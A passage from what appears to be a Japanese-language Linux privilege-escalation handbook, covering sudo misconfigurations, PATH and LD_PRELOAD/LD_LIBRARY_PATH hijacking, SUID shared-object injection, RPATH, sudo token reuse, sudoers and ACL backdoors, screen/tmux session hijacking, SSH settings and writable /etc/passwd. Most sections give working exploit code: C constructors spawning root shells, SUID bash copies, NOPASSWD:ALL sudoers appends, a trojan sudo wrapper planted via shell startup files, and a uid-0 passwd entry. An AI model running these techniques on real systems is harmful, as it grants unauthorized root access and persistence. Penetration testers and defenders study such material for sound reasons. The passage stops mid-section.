特定の sudo ルールで環境変数が保持される場合、Terraform の変数は `TF_VAR_<name>` 環境変数で指定できます。source-symlink の**読み取り**には、リンクをたどり、保護された結果を呼び出し元が読み取り可能な宛先にコピーする provider も必要です。destination-symlink の**書き込み**には別途、呼び出し元が制御できる宛先エントリと、書き込み時にそれをたどる特権 provider が必要です。後続のスケジュール済みジョブは、起こり得る影響の一例にすぎません。いずれかの方法をテストする前に、`sudo -l`、`stat`、`readlink` などの読み取り専用コマンドで、正確な sudo 権限、関連する `.tf` ファイル、選択された CLI config、パスの所有権を確認してください。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い字句的検証では、symlink は解決されません:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraformはシンボリックリンクをたどり、実際の`/root/root.txt`を攻撃者が読み取り可能な宛先にコピーします。同じ方法を使って、宛先のシンボリックリンクを事前に作成することで、特権パスに**書き込む**こともできます（例: providerの宛先パスを`/etc/cron.d/`内に向ける）。

### requiretty / !requiretty

一部の古いディストリビューションでは、sudoに`requiretty`が設定され、対話型TTYからのみsudoを実行できる場合があります。`!requiretty`が設定されている場合（またはこのオプションが設定されていない場合）、reverse shells、cronジョブ、スクリプトなどの非対話型コンテキストからsudoを実行できます。

```bash
Defaults !requiretty
```

これはそれ自体が直接的な脆弱性ではありませんが、完全な PTY を必要とせずに sudo ルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH` が表示される場合や、攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` が設定されている場合、sudo で許可された対象内にある、パスを指定せずに呼び出される外部コマンドが、別のコマンドで置き換えられる可能性があります。<sup>[[3]](#references)</sup> 有効な `secure_path` がない場合も、sudo の実行環境が呼び出し元によって制御された `PATH` を保持するなら、確認する価値があります。設定がないことだけでは、保持される証拠にはなりません。スクリプトを実行せずに読み、正確な RunAs と引数のルール、有効なコマンド検索パス、さらにコマンド名を含む、検索順が先で書き込み可能かつ通過可能なディレクトリを確認してください。認証、`NOEXEC`、シェル組み込みコマンド、絶対パスによるコマンド指定によって、結果が変わる場合があります。

- 要件: パスを指定せずにコマンド（`free`、`df`、`ps` など）を呼び出すスクリプトまたはバイナリを実行する sudo ルール（多くの場合 `NOPASSWD`）と、最初に検索される書き込み可能な PATH エントリ。

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudoの実行時にパスをバイパスする
**ジャンプ**して他のファイルを読み込んだり、**シンボリックリンク**を使用したりします。たとえば、sudoersファイルでは次のように指定します: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

**ワイルドカード**が使われている場合（\*）、さらに簡単です。

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定しない Sudo コマンド/SUID バイナリ

**sudo 権限**が単一のコマンドに対して**パスを指定せずに**付与されている場合（例: _hacker10 ALL= (root) less_）、PATH 変数を変更することで exploit できます。

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

この technique は、**suid** バイナリが **パスを指定せずに別のコマンドを実行する場合にも使用できます（不審な SUID バイナリの内容は必ず** _**strings**_ **で確認してください）**。

[実行する payload の例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### コマンドパスを指定する SUID バイナリ

**suid** バイナリが **パスを指定して別のコマンドを実行する場合**、その SUID ファイルが呼び出すコマンド名の関数を **export** してみてください。

たとえば、SUID バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合は、関数を作成して export します。

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

その後、suid binaryを呼び出すと、この関数が実行されます

### カスタムSUID copy wrapper

source pathとdestination pathを受け取るroot-owned SUID utilityは、2つの異なる信頼境界を越える可能性があります。どちらかの引数からshell commandを組み立てる場合（たとえば、構築した`cp` commandを`system()`に渡す場合）、shell metacharacterによって、effective privilegesで別のcommandが実行される可能性があります。shellを使わずに`cp`を安全に呼び出す場合でも、制限のないdestinationを指定できると、`/etc/passwd`などのファイルへの任意の特権書き込みが可能になることがあります。wrapperの引数処理、effective UIDの挙動、destinationの制限、コピーされるファイルの内容を呼び出し側が制御できるかを確認してください。一般的な`cp`のエラーやSUID bitがあるだけでは、どちらの可能性も証明できません。手動テストを行う前に、binaryと権限を受動的に調査してください。

### SUID wrapperが実行する書き込み可能なscript

よくあるcustom appの設定ミスは、root-owned SUID binary wrapperがscriptを実行する一方で、そのscriptが低権限ユーザーから書き込み可能になっていることです。

典型的なパターン:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` が書き込み可能であれば、payload コマンドを追記してから SUID wrapper を実行できます。

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

簡易チェック:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

この攻撃経路は、`/usr/local/bin` に配置された「maintenance」/「backup」ラッパーで特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリより先に、ローダーが読み込む共有ライブラリ（.so ファイル）を1つ以上指定するために使用されます。この処理は、ライブラリのプリロードとして知られています。

ただし、システムのセキュリティを維持し、この機能が悪用されるのを防ぐため、特に **suid/sgid** 実行ファイルに対して、システムはいくつかの条件を適用します。

- 実ユーザー ID（_ruid_）と実効ユーザー ID（_euid_）が一致しない実行ファイルでは、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid が設定された実行ファイルでは、標準パスにあり、かつ suid/sgid が設定されたライブラリのみがプリロードされます。

`sudo` を使用してコマンドを実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、権限昇格が可能になることがあります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され、認識されるため、昇格した権限で任意のコードが実行される可能性があります。<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** として保存

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

その後、以下を使用して**コンパイルします**：

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

最後に、**escalate privileges**を実行して

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御できる場合、ライブラリの検索先となるパスも制御できるため、同様の privesc を悪用できます。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

通常とは異なる **SUID** 権限を持つバイナリを見つけた場合、**.so** ファイルが適切に読み込まれているか確認するのがよいでしょう。これは次のコマンドを実行して確認できます:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

たとえば、_「open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)」_ のようなエラーに遭遇した場合、exploit の可能性が考えられます。

これを exploit するには、たとえば _「/path/to/.config/libcalc.c」_ という C ファイルを作成し、次のコードを記述します。

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限でシェルを実行することで、権限昇格を試みます。

上記の C ファイルを次のコマンドで共有オブジェクト（.so）にコンパイルします。

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

最後に、影響を受けるSUIDバイナリを実行するとexploitが起動し、システムが侵害される可能性があります。

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

書き込み可能なフォルダからライブラリを読み込む SUID バイナリが見つかったので、そのフォルダに必要な名前でライブラリを作成しましょう。

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

次のようなエラーが発生した場合、

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

つまり、生成したライブラリには `a_function_name` という関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリをまとめたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに**引数のみを注入できる**場合を対象とした同様のリストです。

このプロジェクトでは、制限付きシェルからの脱出、権限の昇格または維持、ファイルの転送、bind shell や reverse shell の起動、その他の post-exploitation タスクに悪用できる Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` を実行できる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、sudo ルールを悪用する方法が見つかるか確認できます。

### Sudo トークンの再利用

**sudo を実行できるものの**パスワードがわからない場合、sudo コマンドが実行されるのを待ってからセッショントークンを乗っ取ることで、権限を昇格できます。<sup>[[18]](#references)</sup>

権限昇格の要件:

- すでにユーザー "_sampleuser_" としてシェルを取得している
- "_sampleuser_" が**過去 15 分以内に**何らかのコマンドの実行に **`sudo` を使用している**（デフォルトでは、この期間中は sudo トークンによってパスワードを入力せずに `sudo` を使用できます）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0
- `gdb` を利用できる（アップロードできればよい）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行して `ptrace_scope` を一時的に有効にするか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` に設定すると、永続的に有効にできます）

これらの要件をすべて満たしている場合は、[**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) を使って**権限を昇格できます**。

- **最初の exploit**（`exploit.sh`）は、_/tmp_ に `activate_sudo_token` バイナリを作成します。これを使って**セッション内の sudo トークンを有効化**できます（自動的に root shell が起動するわけではないため、`sudo su` を実行してください）。

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **2つ目のexploit**（`exploit_v2.sh`）は、_`/tmp`_ に **root所有でsetuidが設定された** sh shell を作成します。

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **3つ目のexploit**（`exploit_v3.sh`）は、**sudoersファイルを作成し**、**sudoトークンを永続化して、すべてのユーザーがsudoを使えるようにする**。

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

フォルダ、またはフォルダ内に作成されたファイルのいずれかに**書き込み権限**があれば、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って、ユーザーと PID を指定した sudo token を**作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合は、パスワードを知らなくても、次の操作で**sudo 権限を取得**できます。

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルと `/etc/sudoers.d` 内のファイルでは、誰が `sudo` を使用できるか、またその使用方法を設定します。これらのファイルは**デフォルトでは root ユーザーと root グループのみが読み取り可能です**。\
**このファイルを読み取り可能であれば**、**興味深い情報を入手できる**可能性があり、いずれかのファイルに**書き込み可能であれば**、**権限昇格**が可能になります。

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

書き込みが可能なら、この権限を悪用できます。

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

これらの権限を悪用するもう一つの方法:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD 向けの `doas` など、`sudo` バイナリの代替手段もあります。`/etc/doas.conf` の設定を確認してください。

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas` がエディタまたはインタプリタを許可している場合は、GTFOBins形式のエスケープを確認します:

```bash
doas vim
:!/bin/sh
```

A root 権限で実行できる `doas` ルールがある場合、元の Python ベースの `dstat` についてもプラグインパスを確認する価値があります。[マニュアル](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1)と[ソースコード](https://github.com/dstat-real/dstat/blob/master/dstat)には、`dstat_*.py` プラグインの配置場所として `/usr/share/dstat/` と `/usr/local/share/dstat/` が記載されています。現在のユーザーが、インストール済みビルドで実際に使われる場所に対して書き込みと検索を行える場合、選択したプラグインが `doas` の RunAs ID で実行される可能性があります。有効なルール、そのビルドでのプラグイン検索先、ディレクトリと親ディレクトリの権限または ACL、呼び出し元がプラグインを選択できるかを確認してください。`dstat` ルールや書き込み可能なディレクトリがあるだけでは、あくまで手掛かりにすぎません。他の `dstat` 実装では、異なるプラグインシステムを使う場合があります。プラグインを読み込まずに、メタデータを受動的に調べてください。

### Sudo Hijacking

ある**ユーザーが通常、マシンに接続して `sudo` を使い**権限昇格していると分かっており、そのユーザーのコンテキストでシェルを取得できた場合、**コードを root として実行してから、そのユーザーのコマンドを実行する新しい sudo 実行ファイルを作成できます**。次に、ユーザーのコンテキストの **$PATH を変更**（たとえば、新しいパスを .bash_profile に追加）し、ユーザーが sudo を実行したときに、作成した sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)にも別の例があります。

または、次のようなものを実行します。

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 共有ライブラリ

### ld.so

`/etc/ld.so.conf` ファイルは、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**ライブラリの検索対象となる他のフォルダー**を示します。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**つまり、システムは `/usr/local/lib` 内のライブラリを検索します**。

何らかの理由で、**ユーザーが** `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルで指定されたフォルダーに書き込み権限を持っている場合、権限昇格が可能になることがあります。\
次のページで、**この設定ミスを悪用する方法**をご覧ください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib`を`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているため、この場所にあるものがプログラムによって使用されます。

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

次に、`/var/tmp` に悪意のあるライブラリを次のコマンドで作成します。

`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilitiesは、プロセスに**利用可能なroot権限の一部**を付与します。これにより、rootの**権限がより小さな独立した単位に分割**されます。これらの単位は、それぞれ個別にプロセスへ付与できます。この方法では、権限の全体が縮小され、悪用のリスクが軽減されます。\
次のページを読んで、**capabilitiesとその悪用方法について詳しく学んでください**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**「execute」ビット**があると、対象ユーザーはフォルダーに「**cd**」できます。\
**「read」ビット**があるとユーザーは**ファイルを一覧表示**でき、**「write」ビット**があると**ファイルを削除**したり、新しい**ファイルを作成**したりできます。

## ACLs

Access Control Lists (ACLs)は、従来のugo/rwx権限を**上書きできる**、任意アクセス制御の第2層です。これらの権限により、所有者でもグループの一員でもない特定のユーザーに対して権限を許可または拒否できるため、ファイルやディレクトリへのアクセス制御が強化されます。このレベルの**細やかな制御により、より正確なアクセス管理が可能になります**。詳しくは[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)をご覧ください。<sup>[[19]](#references)</sup>

ユーザー「kali」にファイルの読み取りおよび書き込み権限を**付与**します：

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

システムから特定のACLを持つファイルを**取得する**:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in に潜む ACL バックドア

よくある設定ミスとして、`/etc/sudoers.d/` 内の root 所有で mode `440` のファイルが、ACL によって低権限ユーザーにも書き込みを許可していることがあります。

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-`のようなものがあれば、モードビットが制限的でも、そのユーザーはsudoルールを追加できます。

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

これは、`ls -l`だけを使った調査では見落としやすいため、影響の大きいACL persistence/privesc経路です。

## 開いているシェルセッション

ユーザー間のGNU Screenアクセスは、バージョンだけではなく、**実行中のセッションの設定とACL**に依存します。[GNU Screenのドキュメント](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html)によると、multiuserサポートを有効にしてビルドする必要があり、`multiuser on`と`acladd`、または適切な`aclchg`による許可があれば、別のユーザーがアタッチできます。[マニュアルでは、ユーザー間のセッション検索にsetuid-rootも必要とされています](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)。root所有のソケットが見えることや、SUIDの`screen`バイナリがあることだけでは、rootシェルにアタッチできるとは判断できません。これを権限昇格として扱う前に、実行中のセッションでmultiuserが有効になっていること、現在のユーザーに入力およびコマンドの実効権限があること、さらに、そのセッション内のシェルが特権所有者として実行されていることを確認してください。

### screen sessions hijacking

**screenセッションを一覧表示する**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - ソケットの場所（一部のシステムでは、一方がもう一方のシンボリックリンクとして公開される）：ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションに接続する**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux セッションのハイジャック

これは**古い tmux バージョン**で発生していた問題です。非特権ユーザーとして、root が作成した tmux (v2.1) セッションをハイジャックすることはできませんでした。

**tmux セッションを一覧表示**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socketの場所（システムによっては、一方がもう一方のsymlinkとして公開される）- tmux sessions hijacking: tmux -S /tmp/dev sess ls そのSocketを使って一覧表示します。そのSocketでtmux sessionを開始できます...](<../../images/image (837).png>)

**セッションにアタッチする**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

HTBの**Valentine box**で例を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

脆弱性があった過去の期間中に、影響を受けるDebianまたは派生版のOpenSSLビルドで生成された鍵は、予測可能な乱数を使用している可能性があります。ホストの現在のディストリビューションやパッチ適用済みのOpenSSLバージョンだけでは、古い鍵の生成方法は判断できません。**対象の鍵**を、適切な過去のブラックリストおよびその由来と照合してください。Debianの[`ssh-vulnkey`マニュアル](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html)では、公開鍵と`authorized_keys`の確認方法が説明されており、[DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1)にはOpenSSLの修正が記録されています。特権アカウントの`authorized_keys`に該当するエントリがあっても、対応する秘密鍵を入手でき、実効SSHポリシーがそのアカウントでの鍵の使用を引き続き許可している場合に限り、権限昇格の手掛かりになります。脆弱な**ホスト**鍵自体はログイン認証情報ではありません。侵害された鍵を交換し、古い鍵の認証設定を削除してください。

### SSHの興味深い設定値

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。OpenSSHの上流版でのデフォルトは`yes`ですが、ディストリビューションの設定で上書きされる場合があります。
- **PubkeyAuthentication:** 公開鍵認証を許可するかどうかを指定します。デフォルトは`yes`です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、空のパスワード文字列を持つアカウントへのログインをサーバーが許可するかどうかを指定します。デフォルトは`no`です。

### ログイン制御ファイル

これらのファイルは、誰がどのようにログインできるかに影響します。

- **`/etc/nologin`**: 存在する場合、root以外のログインをブロックし、ファイル内のメッセージを表示します。
- **`/etc/securetty`**: rootがログインできる場所を制限します（TTYの許可リスト）。
- **`/etc/motd`**: ログイン後に表示されるバナーです（環境やメンテナンスに関する情報が漏れる可能性があります）。

### PermitRootLogin

rootがsshを使ってログインできるかどうかを指定します。OpenSSHの上流版でのデフォルトは`prohibit-password`ですが、ディストリビューションの設定で上書きされる場合があります。指定可能な値は次のとおりです。

- `yes`: rootはパスワードと秘密鍵を使ってログインできます
- `without-password`または`prohibit-password`: rootは秘密鍵を使った場合にのみログインできます
- `forced-commands-only`: rootは秘密鍵を使い、かつcommandsオプションが指定されている場合にのみログインできます
- `no` : 不可

### 信頼されたSSHユーザー証明書認証局

`TrustedUserCAKeys`は、sshdが**ユーザー**証明書への署名に使用するものとして信頼する公開鍵を指定します。対応する秘密CA鍵を低権限ユーザーが読み取れる場合は、誰が証明書を取得できるか、およびその証明書でどのアカウントのプリンシパルとして認証できるかを確認してください。`AuthorizedPrincipalsFile`または`AuthorizedPrincipalsCommand`で受け入れる名前を制限できます。どちらも設定されていない場合、証明書には対象アカウント名が含まれている必要があります。`PermitRootLogin prohibit-password`はrootへのパスワード認証をブロックしますが、証明書認証は許可される場合があります。鍵のパスが露出しているだけではアクセスできる証拠になりません。公開鍵と秘密鍵のペア、実効`Match`ルール、アカウントポリシー、鍵のパスフレーズ、失効状態、受け入れられる署名アルゴリズムを確認してください。列挙結果に秘密鍵のバイト列を含めないでください。[OpenSSHサーバー設定マニュアル](https://man.openbsd.org/sshd_config#TrustedUserCAKeys)を参照してください。

特権委譲ルールによって、現在のユーザーが鍵所有者のIDで制限のない[`ssh-keygen -s`などの証明書署名コマンド](https://man.openbsd.org/ssh-keygen#-s)を実行できる場合、秘密CA鍵を読み取れなくても使用できる可能性があります。許可されている正確なコマンドと引数を、署名者アカウントによる鍵へのアクセス、実効sshd設定で信頼される公開CA、対象アカウントで受け入れられるプリンシパル、証明書の有効期間、およびそのアカウントのログインポリシーと照合してください。委譲された署名コマンドや信頼されたCAファイルだけでは、別のアカウントにアクセスできる証拠にはなりません。受動的な列挙中にテスト証明書へ署名しないでください。

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h`のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パス（`/`で始まるパス）**または**ユーザーのホームディレクトリからの相対パス**を指定できます。例：

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

その設定では、ユーザー「**testusername**」の**秘密**鍵でログインしようとすると、ssh はその鍵の公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと照合します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使うと、サーバー上に（パスフレーズのない！）鍵を置いたままにせず、**ローカルの SSH 鍵を使用**できます。つまり、ssh で**あるホストに**接続し、そこから**最初のホストにある鍵を使って**、さらに**別のホストへ**接続できます。

このオプションを `$HOME/.ssh.config` に次のように設定します。

```
Host example.com
  ForwardAgent yes
```

`Host` が毎回 `*` になっている場合、ユーザーが別のマシンに移動するたびに、そのホストが鍵にアクセスできることに注意してください（これはセキュリティ上の問題です）。

`/etc/ssh_config` ファイルは、この**オプション**を**上書き**し、この設定を許可または禁止できます。\
`/etc/sshd_config` ファイルでは、キーワード `AllowAgentForwarding` を使って ssh-agent forwarding を**許可**または禁止できます（デフォルトは許可）。

環境内で Forward Agent が設定されている場合は、以下のページを確認してください。**これを悪用して権限昇格できる可能性があります**。


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

`/etc/profile` ファイルと `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを起動したときに実行される**スクリプト**です。そのため、これらのいずれかに**書き込みまたは変更**できれば、権限昇格できます。

```bash
ls -l /etc/profile /etc/profile.d/
```

不審なプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow Files

OSによっては、`/etc/passwd` および `/etc/shadow` ファイルの名前が異なる場合や、バックアップが存在する場合があります。そのため、これらのファイルを**すべて検索**し、**読み取り可能か確認**して、ファイル内に**ハッシュがあるか**調べることをおすすめします。

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります。

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 書き込み可能な /etc/passwd

まず、次のいずれかのコマンドでパスワードを生成します。

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

次に、ユーザー hacker を追加し、生成されたパスワードを設定します。

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで、`hacker:hacker` を使って `su` コマンドを実行できます。

または、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。

```
